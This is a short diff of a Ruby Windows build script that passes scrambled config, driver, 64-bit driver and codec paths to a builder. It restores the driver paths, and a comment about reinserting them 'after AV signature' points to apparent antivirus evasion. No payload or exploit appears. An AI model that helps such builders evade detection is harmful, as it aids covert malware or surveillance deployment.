@@ -167,10 +167,10 @@ class BuildWindows < Build
                                           path(@scrambled[:config])+' '+
 
                                           # TODO: reinsert those after AV signature
-                                          'null'+' '+
-                                          'null'+' '+
-                                          #path(@scrambled[:driver])+' '+
-                                          #(bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+                                          #'null'+' '+
+                                          #'null'+' '+
+                                          path(@scrambled[:driver])+' '+
+                                          (bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
                                           (codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
